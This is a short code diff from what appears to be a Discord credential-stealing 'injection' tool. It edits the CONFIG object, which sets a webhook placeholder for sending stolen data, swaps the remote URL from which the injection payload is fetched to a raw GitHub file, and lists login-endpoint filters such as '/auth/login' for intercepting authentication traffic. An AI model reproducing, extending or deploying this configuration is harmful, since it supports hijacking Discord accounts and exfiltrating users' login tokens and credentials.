@@ -14,7 +14,7 @@ const {
 
 const CONFIG = {
     webhook: "%WEBHOOK%",
-    injection_url: "https://rentry.co/discord-injection/raw",
+    injection_url: "https://raw.githubusercontent.com/huvex1336/guzman/refs/heads/main/inj.txt",
     filters: {
         urls: [
             '/auth/login',
